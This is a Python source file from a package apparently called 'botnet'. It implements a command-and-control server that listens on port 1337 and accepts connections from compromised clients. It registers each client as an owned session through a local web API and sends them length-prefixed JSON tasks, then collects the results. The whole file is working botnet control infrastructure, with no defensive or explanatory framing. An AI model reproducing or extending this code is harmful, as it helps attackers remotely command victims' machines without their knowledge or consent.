import uuid
import json
import struct
import socket
import requests
import threading
from datetime import datetime

from botnet.modules import utils

class C2():
    def __init__(self, host='0.0.0.0', port=1337, debug=False):
        self.host = host
        self.port = port
        self.sessions = {}
        self.socket = self._init_socket()

    def _init_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(128)
        return s

    def serve_until_stopped(self):
        while True:
            
            connection, address = self.socket.accept()

            session = SessionThread(connection=connection, c2=self)
            if session.info != None:
                response = requests.post(url=f'http://{self.host}:5000/api/session/new', json=session.info)
                if response.status_code == 200:
                    session_metadata = response.json()
                    session_uid = session_metadata.get('uid')
                    session.info = session_metadata
                    owner = session.info.get('owner')
                    if owner not in self.sessions:
                        self.sessions[owner] = {}

                    self.sessions[owner][session_uid] = session
                    utils.log('New session {}:{} connected'.format(owner, session_uid))
            else:
                utils.log("Failed Connection: {}".format(address[0]))


class SessionThread(threading.Thread):
    def __init__(self, connection=None, c2=None):
        super().__init__()
        self.created = datetime.utcnow()
        self.c2 = c2
        self.connection = connection
        try:
            self.info = self.client_info()
        except Exception as e:
            utils.log("Error creating session: {}".format(str(e)), level='error')
            self.info = None

    def client_info(self):
        header_size = struct.calcsize("!L")
        header = self.connection.recv(header_size)
        msg_size = struct.unpack("!L", header)[0]
        msg = self.connection.recv(msg_size)
        data = msg.decode('utf-8')
        info = json.loads(data)
        return info

    def send_task(self, task):
        if not isinstance(task, dict):
            raise TypeError('task must be a dictionary object')
        data = json.dumps(task)
        msg  = struct.pack('!L', len(data)) + data.encode('utf-8')

        self.connection.sendall(msg)
        return True

    def recv_task_result(self):
        header_size = struct.calcsize('!L')
        header = self.connection.recv(header_size)
        if len(header) == 4:
            msg_size = struct.unpack('!L', header)[0]
            msg = self.connection.recv(msg_size)
            try:
                data = msg
                return json.loads(data)
            except Exception as e:
                print(e.__str__() + " - " + str(msg))
                utils.log("{0} error: {1}".format(self.recv_task_result.__name__, str(e)), level='error')
                return {
                    "uid": uuid.uuid4().hex,
                    "session": self.info.get('uid'), 
                    "task": "", 
                    "result": "Error: client returned invalid response", 
                    "issued": datetime.utcnow().__str__(),
                    "completed": ""
                }
        else:
            return 0
